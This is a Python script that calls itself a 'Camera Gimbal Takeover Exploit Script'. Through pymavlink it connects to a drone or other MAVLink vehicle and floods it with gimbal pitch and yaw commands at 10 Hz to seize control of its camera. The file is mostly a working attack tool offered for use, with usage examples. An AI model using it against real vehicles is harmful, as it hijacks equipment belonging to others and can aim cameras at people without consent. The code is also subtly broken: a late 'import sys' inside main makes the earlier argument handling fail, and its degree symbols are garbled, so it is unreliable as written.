#!/usr/bin/env python3
"""
Camera Gimbal Takeover Exploit Script
Injects gimbal control commands to manipulate camera orientation
"""

import sys
import time
from pymavlink import mavutil

def control_gimbal(connection, pitch=None, yaw=None, pitch_rate=None, yaw_rate=None):
    """
    Control gimbal orientation
    
    Args:
        connection: MAVLink connection object
        pitch: Pitch angle in degrees (-90 to 90)
        yaw: Yaw angle in degrees (-180 to 180)
        pitch_rate: Pitch rate in degrees/second
        yaw_rate: Yaw rate in degrees/second
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Default values if not specified
    if pitch is None:
        pitch = 0.0
    if yaw is None:
        yaw = 0.0
    if pitch_rate is None:
        pitch_rate = 0.0
    if yaw_rate is None:
        yaw_rate = 0.0
    
    # Convert degrees to radians for MAVLink
    pitch_rad = pitch * 3.14159265359 / 180.0
    yaw_rad = yaw * 3.14159265359 / 180.0
    pitch_rate_rad = pitch_rate * 3.14159265359 / 180.0
    yaw_rate_rad = yaw_rate * 3.14159265359 / 180.0
    
    print(f"[*] Controlling gimbal:")
    print(f"    Pitch: {pitch}째 ({pitch_rad:.4f} rad)")
    print(f"    Yaw: {yaw}째 ({yaw_rad:.4f} rad)")
    print(f"    Pitch Rate: {pitch_rate}째/s")
    print(f"    Yaw Rate: {yaw_rate}째/s")
    
    # Send gimbal manager pitch/yaw command
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_DO_GIMBAL_MANAGER_PITCHYAW,
        0,  # Confirmation
        pitch_rad,  # Pitch angle (rad)
        yaw_rad,  # Yaw angle (rad)
        pitch_rate_rad,  # Pitch rate (rad/s)
        yaw_rate_rad,  # Yaw rate (rad/s)
        0,  # Gimbal device ID
        0,  # Reserved
        0   # Reserved
    )
    
    print("[+] Gimbal control command sent")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gimbal_takeover.py <connection> [pitch] [yaw] [pitch_rate] [yaw_rate]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  pitch         Pitch angle in degrees (-90 to 90, default: 0)")
        print("  yaw           Yaw angle in degrees (-180 to 180, default: 0)")
        print("  pitch_rate    Pitch rate in degrees/second (default: 0)")
        print("  yaw_rate      Yaw rate in degrees/second (default: 0)")
        print("\nExamples:")
        print("  python3 gimbal_takeover.py udp:127.0.0.1:14550")
        print("  python3 gimbal_takeover.py udp:127.0.0.1:14550 -45 90")
        print("  python3 gimbal_takeover.py udp:127.0.0.1:14550 0 0 10 10")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    
    # Parse and validate gimbal angles
    pitch = None
    yaw = None
    pitch_rate = None
    yaw_rate = None
    
    if len(sys.argv) > 2:
        try:
            pitch = float(sys.argv[2])
            if not -90 <= pitch <= 90:
                raise ValueError("Pitch must be between -90 and 90 degrees")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid pitch: {e}")
            sys.exit(1)
    
    if len(sys.argv) > 3:
        try:
            yaw = float(sys.argv[3])
            if not -180 <= yaw <= 180:
                raise ValueError("Yaw must be between -180 and 180 degrees")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid yaw: {e}")
            sys.exit(1)
    
    if len(sys.argv) > 4:
        try:
            pitch_rate = float(sys.argv[4])
            if not -100 <= pitch_rate <= 100:
                raise ValueError("Pitch rate must be between -100 and 100 deg/s")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid pitch rate: {e}")
            sys.exit(1)
    
    if len(sys.argv) > 5:
        try:
            yaw_rate = float(sys.argv[5])
            if not -100 <= yaw_rate <= 100:
                raise ValueError("Yaw rate must be between -100 and 100 deg/s")
        except (ValueError, TypeError) as e:
            print(f"[-] Invalid yaw rate: {e}")
            sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Control gimbal
    print("[*] Taking over gimbal control (Press Ctrl+C to stop)...")
    try:
        while True:
            control_gimbal(connection, pitch, yaw, pitch_rate, yaw_rate)
            time.sleep(0.1)  # Send commands at 10Hz
    except KeyboardInterrupt:
        print("\n[*] Stopping gimbal control...")

if __name__ == "__main__":
    main()
